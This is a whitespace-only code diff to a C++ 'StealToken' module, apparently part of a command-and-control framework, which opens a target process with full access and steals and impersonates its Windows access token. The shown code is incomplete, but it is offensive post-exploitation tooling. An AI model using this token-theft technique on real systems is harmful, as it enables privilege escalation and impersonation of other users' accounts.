@@ -41,9 +41,9 @@ __attribute__((visibility("default"))) StealToken* StealTokenConstructor()
 
 StealToken::StealToken()
 #ifdef BUILD_TEAMSERVER
-	: ModuleCmd(std::string(moduleName), moduleHash)
+    : ModuleCmd(std::string(moduleName), moduleHash)
 #else
-	: ModuleCmd("", moduleHash)
+    : ModuleCmd("", moduleHash)
 #endif
 {
 }
@@ -54,21 +54,21 @@ StealToken::~StealToken()
 
 std::string StealToken::getInfo()
 {
-	std::string info;
+    std::string info;
 #ifdef BUILD_TEAMSERVER
-	info += "stealToken:\n";
-	info += "Steal a token and impersonate the it. You must have administrator privilege. \n";
-	info += "exemple:\n";
-	info += "- stealToken pid \n";
+    info += "stealToken:\n";
+    info += "Steal a token and impersonate the it. You must have administrator privilege. \n";
+    info += "exemple:\n";
+    info += "- stealToken pid \n";
 #endif
-	return info;
+    return info;
 }
 
 int StealToken::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
 #if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
     if(splitedCmd.size() == 2)
-	{
+    {
         int pid=-1;
         try
         {
@@ -77,34 +77,34 @@ int StealToken::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
         catch (const std::invalid_argument& ia) 
         {
             c2Message.set_returnvalue(getInfo());
-		    return -1;
+            return -1;
         }
 
         c2Message.set_instruction(splitedCmd[0]);
         c2Message.set_cmd("");
         c2Message.set_pid(pid);
     }
-	else
-	{
-		c2Message.set_returnvalue(getInfo());
-		return -1;
-	}
+    else
+    {
+        c2Message.set_returnvalue(getInfo());
+        return -1;
+    }
 #endif
 
-	return 0;
+    return 0;
 }
 
 
 int StealToken::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
-	int pid = c2Message.pid();
+    int pid = c2Message.pid();
 
     std::string result = stealToken(pid);
 
-	c2RetMessage.set_instruction(c2RetMessage.instruction());
-	c2RetMessage.set_cmd("");
-	c2RetMessage.set_returnvalue(result);
-	return 0;
+    c2RetMessage.set_instruction(c2RetMessage.instruction());
+    c2RetMessage.set_cmd("");
+    c2RetMessage.set_returnvalue(result);
+    return 0;
 }
 
 //https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonusera
@@ -114,7 +114,7 @@ int StealToken::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 std::string StealToken::stealToken(int pid)
 {
-	std::string result;
+    std::string result;
 
     if(pid==-1)
     {
@@ -131,7 +131,7 @@ std::string StealToken::stealToken(int pid)
     int target = pid;
 
     HANDLE processHandle;
-	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
 
     HANDLE tokenHandle;
     // TODO pas besoin de TOKEN_ALL_ACCESS
@@ -169,5 +169,5 @@ std::string StealToken::stealToken(int pid)
 
 #endif
 
-	return result;
+    return result;
 }
